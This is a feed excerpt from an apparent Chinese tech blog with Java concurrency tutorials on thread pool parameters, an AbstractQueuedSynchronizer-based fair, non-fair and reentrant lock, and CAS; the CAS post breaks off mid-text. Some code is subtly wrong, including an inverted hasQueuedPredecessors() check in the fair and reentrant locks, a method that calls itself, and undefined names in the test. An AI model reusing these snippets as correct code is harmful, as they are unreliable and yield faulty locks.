    
    
  </entry>
  
  <entry>
    <title>Thread Pool</title>
    <link href="https://kayleh.top/Thread-pool/"/>
    <id>https://kayleh.top/Thread-pool/</id>
    <published>2021-04-20T08:37:35.000Z</published>
    <updated>2021-04-20T16:51:26.692Z</updated>
    
    <content type="html"><![CDATA[<p>异步执行的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread(r).start();</span><br></pre></td></tr></table></figure><p>统一的工具类，定一个接口来实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Executor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable r)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新线程：直接创建一个新线程运行</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlashExecutor</span> <span class="keyword">implements</span> <span class="title">Executor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(Runnable r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(r).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>假如有 10000 个人都调用这个工具类提交任务，那就会创建 10000 个线程来执行，这肯定不合适吧！能不能控制一下线程的数量呢？</p></blockquote><p>可以把这个任务 r 丢到一个 tasks 队列中，然后只启动一个线程，就叫它 <strong>Worker</strong> 线程吧，不断从 tasks 队列中取任务，执行任务。这样无论调用者调用多少次，永远就只有一个 Worker 线程在运行，像这样。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640.gif" alt="图片"></p><p>这个设计有了三个重大的意义：</p><p>\1. 控制了线程数量。</p><p>\2. 队列不但起到了缓冲的作用，还将任务的提交与执行解耦了。</p><p>\3. 最重要的一点是，解决了每次重复创建和销毁线程带来的系统开销。</p><blockquote><p>不过只有一个后台的工作线程 Worker 会不会少了点？还有如果这个 tasks 队列满了怎么办呢？</p></blockquote><p>Worker 线程的数量要增加，但是具体数量要让使用者决定，调用时传入，就叫核心线程数 <strong>corePoolSize</strong> 吧。</p><p>这样设计。</p><p>\1. 初始化线程池时，直接启动 corePoolSize 个工作线程 Worker 先跑着。</p><p>\2. 这些 Worker 就是死循环从队列里取任务然后执行。</p><p>\3. execute 方法仍然是直接把任务放到队列，但队列满了之后直接抛弃</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937229662.gif" alt="图片"></p><blockquote><p>初始化的时候，就创建了一堆 Worker 线程在那空跑着，假如此时并没有异步任务提交过来执行，这就有点浪费了。</p><p>队列一满，就直接把新任务丢弃了，这样有些粗暴，能不能让调用者自己决定该怎么处理呢？</p></blockquote><p>改进</p><p><strong>1. 按需创建Worker</strong>：刚初始化线程池时，不再立刻创建 corePoolSize 个工作线程，而是等待调用者不断提交任务的过程中，逐渐把工作线程 Worker 创建出来，等数量达到 corePoolSize 时就停止，把任务直接丢到队列里。那就必然要用一个属性记录已经创建出来的工作线程数量，就叫 <strong>workCount</strong> 吧。</p><p><strong>2. 加拒绝策略</strong>：实现上就是增加一个入参，类型是一个接口 <strong>RejectedExecutionHandler</strong>，由调用者决定实现类，以便在任务提交失败后执行 rejectedExecution 方法。</p><p><strong>3. 增加线程工厂</strong>：实现上就是增加一个入参，类型是一个接口 <strong>ThreadFactory</strong>，增加工作线程时不再直接 new 线程，而是调用这个由调用者传入的 ThreadFactory 实现类的 newThread 方法。</p><p>就像下面这样。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937168495.gif" alt="图片"></p><blockquote><p>在这个场景里，弹性就是在任务提交比较频繁，和任务提交非常不频繁这两种情况下，你这个代码是否有问题？</p><p>这个线程池，当提交任务的量突增时，工作线程和队列都被占满了，就只能走拒绝策略，其实就是被丢弃掉</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937173510.gif" alt="图片"></p><p>调用方可以通过设置很大的核心线程数 corePoolSize 来解决这个问题</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937221389.gif" alt="图片"></p><blockquote><p>可以，但一般场景下 QPS 高峰期都很短，而为了这个很短暂的高峰，设置很大的核心线程数，简直太浪费资源了</p></blockquote><p>最大线程数 <strong>maximumPoolSize</strong>。当核心线程数和队列都满了时，新提交的任务仍然可以通过创建新的工作线程（叫它<strong>非核心线程</strong>），直到工作线程数达到 maximumPoolSize 为止，这样就可以缓解一时的高峰期了，而用户也不用设置过大的核心线程数。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640.png" alt="图片"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937269134.gif" alt="图片"></p><p>\1. 开始的时候和上一版一样，当 workCount &lt; corePoolSize 时，通过创建新的 Worker 来执行任务。</p><p>\2. 当 workCount &gt;= corePoolSize 就停止创建新线程，把任务直接丢到队列里。</p><p>\3. 但当队列已满且仍然 workCount &lt; maximumPoolSize 时，不再直接走拒绝策略，而是创建非核心线程，直到 workCount = maximumPoolSize，再走拒绝策略。</p><p>这样 corePoolSize 就负责平时大多数情况所需要的工作线程数，而 maximumPoolSize 就负责在高峰期临时扩充工作线程数。</p><p>高峰时期的弹性搞定了，那自然就还要考虑低谷时期。当长时间没有任务提交时，核心线程与非核心线程都一直空跑着，浪费资源。我们可以给<strong>非核心线程</strong>设定一个超时时间 <strong>keepAliveTime</strong>，当这么长时间没能从队列里获取任务时，就不再等了，销毁线程。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937263714.gif" alt="图片"></p><p>这回线程池在 QPS 高峰时可以临时扩容，QPS 低谷时又可以及时回收线程（非核心线程）而不至于浪费资源，真的显得十分 Q 弹呢。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937301920.gif" alt="图片"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">FlashExecutor</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> corePoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> maximumPoolSize,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">long</span> keepAliveTime,</span></span></span><br><span class="line"><span class="function"><span class="params">        TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">        BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">        ThreadFactory threadFactory,</span></span></span><br><span class="line"><span class="function"><span class="params">        RejectedExecutionHandler handler)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ... <span class="comment">// 省略一些参数校验</span></span><br><span class="line">    <span class="keyword">this</span>.corePoolSize = corePoolSize;</span><br><span class="line">    <span class="keyword">this</span>.maximumPoolSize = maximumPoolSize;</span><br><span class="line">    <span class="keyword">this</span>.workQueue = workQueue;</span><br><span class="line">    <span class="keyword">this</span>.keepAliveTime = unit.toNanos(keepAliveTime);</span><br><span class="line">    <span class="keyword">this</span>.threadFactory = threadFactory;</span><br><span class="line">    <span class="keyword">this</span>.handler = handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些参数分别是</p><p><strong>int corePoolSize</strong>：核心线程数</p><p><strong>int maximumPoolSize</strong>：最大线程数</p><p><strong>long keepAliveTime</strong>：非核心线程的空闲时间</p><p><strong>TimeUnit unit</strong>：空闲时间的单位</p><p><strong>BlockingQueue workQueue</strong>：任务队列（线程安全的阻塞队列）</p><p><strong>ThreadFactory threadFactory</strong>：线程工厂</p><p><strong>RejectedExecutionHandler handler</strong>：拒绝策略</p><p>整个任务的提交流程是</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640.webp" alt="图片"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;异步执行的代码&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;
      
    
    </summary>
    
    
    
      <category term="Concurrency" scheme="https://kayleh.top/tags/Concurrency/"/>
    
  </entry>
  
  <entry>
    <title>a Lock Based on ReentrantLock</title>
    <link href="https://kayleh.top/Implement-a-lock-based-on-ReentrantLock/"/>
    <id>https://kayleh.top/Implement-a-lock-based-on-ReentrantLock/</id>
    <published>2021-04-19T08:59:25.000Z</published>
    <updated>2021-04-19T17:26:04.313Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基于-ReentrantLock实现一个锁"><a href="#基于-ReentrantLock实现一个锁" class="headerlink" title="基于 ReentrantLock实现一个锁"></a>基于 ReentrantLock实现一个锁</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> aqsLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.AbstractQueuedSynchronizer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Kayleh</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2021/4/20 0:57</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">aqsLock</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sync.acquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sync.release(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Sync sync = <span class="keyword">new</span> Sync();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Sync</span> <span class="keyword">extends</span> <span class="title">AbstractQueuedSynchronizer</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// CAS 方式尝试获取锁，成功返回true，失败返回false</span></span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 释放锁</span></span><br><span class="line">            setState(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本功能实现，测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可能发生线程安全问题的共享变量</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 两个线程并发对 count++</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 创建两个线程，执行add()操作</span></span><br><span class="line">    Thread th1 = <span class="keyword">new</span> Thread(()-&gt; add());</span><br><span class="line">    Thread th2 = <span class="keyword">new</span> Thread(()-&gt; add());</span><br><span class="line">    <span class="comment">// 启动两个线程</span></span><br><span class="line">    th1.start();</span><br><span class="line">    th2.start();</span><br><span class="line">    <span class="comment">// 等待两个线程执行结束</span></span><br><span class="line">    th1.join();</span><br><span class="line">    th2.join();</span><br><span class="line">    <span class="comment">// 这里应该是 20000 就对了，说明锁生效了</span></span><br><span class="line">    System.out.println(count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 我画了一上午写出来的锁，哈哈</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> ExampleLock exampleLock = <span class="keyword">new</span> ExampleLock();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环 count++，进行 10000 次</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    exampleLock.lock();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    add2();</span><br><span class="line">    <span class="comment">// 没啥异常，我就直接释放锁了</span></span><br><span class="line">    exampleLock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>非公平锁</strong>，因为线程抢锁不排队，纯看脸。</p><p>实现的排队获取锁，叫<strong>公平锁</strong>，因为只要有线程在排队，新来的就得乖乖去排队，不能直接抢。 </p></blockquote><h2 id="实现一个公平锁"><a href="#实现一个公平锁" class="headerlink" title="实现一个公平锁"></a>实现一个公平锁</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 原有基础上加上这个</span></span><br><span class="line">    <span class="keyword">if</span> (有线程在等待队列中) &#123;</span><br><span class="line">        <span class="comment">// 返回获取锁失败，AQS会帮我把该线程放在等待队列队尾的</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> aqsLock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.locks.AbstractQueuedSynchronizer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: Kayleh</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2021/4/20 0:57</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">aqsLock</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">aqsLock</span><span class="params">(<span class="keyword">boolean</span> fair)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sync = fair ? <span class="keyword">new</span> Sync() : <span class="keyword">new</span> NofairSync();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sync.acquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        sync.release(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Sync sync = <span class="keyword">new</span> Sync();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Sync</span> <span class="keyword">extends</span> <span class="title">AbstractQueuedSynchronizer</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// CAS 方式尝试获取锁，成功返回true，失败返回false</span></span><br><span class="line">            <span class="keyword">if</span> (hasQueuedPredecessors() &amp;&amp; compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 释放锁</span></span><br><span class="line">            setState(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">NofairSync</span> <span class="keyword">extends</span> <span class="title">Sync</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// CAS 方式尝试获取锁，成功返回true，失败返回false</span></span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> arg)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 释放锁</span></span><br><span class="line">            setState(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>工具会导致一个线程卡死，一直获取不到锁 </p></blockquote><h2 id="实现方法可以重入"><a href="#实现方法可以重入" class="headerlink" title="实现方法可以重入"></a>实现方法可以重入</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomeThing2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    flashLock.lock();</span><br><span class="line">    doSomeThing2();</span><br><span class="line">    flashLock.unlock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doSomeThing2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    flashLock.lock();</span><br><span class="line">    ...</span><br><span class="line">    flashLock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>一个线程执行了一个方法，获取了锁，这个方法没有结束，又调用了另一个需要锁的方法，于是卡在这再也不走了。 </p></blockquote><p>怎么 <strong>让同一个线程持有锁时，还能继续获取锁（可重入）</strong>，只有当不同线程才互斥呢？ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">    <span class="keyword">int</span> c = getState();</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (hasQueuedPredecessors() &amp;&amp; compareAndSetState(<span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="comment">// 拿到锁记得记录下持锁线程是自己</span></span><br><span class="line">            setExclusiveOwnerThread(current);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">        <span class="comment">// 看见锁被占了(state!=0)也别放弃，看看是不是自己占的</span></span><br><span class="line">        setState(c + acquires);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基于-ReentrantLock实现一个锁&quot;&gt;&lt;a href=&quot;#基于-ReentrantLock实现一个锁&quot; class=&quot;headerlink&quot; title=&quot;基于 ReentrantLock实现一个锁&quot;&gt;&lt;/a&gt;基于 ReentrantLock实现一个锁&lt;/
      
    
    </summary>
    
    
    
      <category term="Concurrency" scheme="https://kayleh.top/tags/Concurrency/"/>
    
  </entry>
  
  <entry>
    <title>CAS &amp; AQS</title>
    <link href="https://kayleh.top/CAS-and-AQS/"/>
    <id>https://kayleh.top/CAS-and-AQS/</id>
    <published>2021-04-18T09:43:22.000Z</published>
    <updated>2021-04-19T17:00:07.119Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CAS（Compare-And-Swap）原理分析"><a href="#CAS（Compare-And-Swap）原理分析" class="headerlink" title="CAS（Compare And Swap）原理分析"></a>CAS（Compare And Swap）原理分析</h2><p>字面意思是<strong>比较和交换</strong>，先看看下面场景（A 和 B 线程同时执行下面的代码）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">10</span>;<span class="comment">//代码1</span></span><br><span class="line">i = <span class="number">10</span>;<span class="comment">//代码2</span></span><br></pre></td></tr></table></figure><p>场景 1：A 线程执行代码 1 和代码 2，然后 B 线程执行代码 1 和代码 2，CAS 成功。</p><p>场景 2：A 线程执行代码 1，此时 B 线程执行代码 1 和代码 2，A 线程执行代码 2，CAS 不成功，为什么呢？</p><p>因为 A 线程执行代码 1 时候会旧值（i 的内存地址的值 10）保存起来，执行代码 2 的时候先判断 i 的最新值（可能被其他线程修改了）跟旧值比较，如果相等则把 i 赋值为 20，如果不是则 CAS 不成功。CAS 是一个<strong>原子性操作</strong>，要么成功要么失败，CAS 操作用得比较多的是 sun.misc 包的 Unsafe 类，而 Java 并发包大量使用 Unsafe 类的 CAS 操作，比如：AtomicInteger 整数原子类（本质是自旋锁 + CAS），CAS 不需加锁，提高代码运行效率。也是一种乐观锁方式，我们通常认为在大多数场景下不会出现竞争资源的情况，如果 CAS 操作失败，会不断重试直到成功。</p><p><strong>CAS 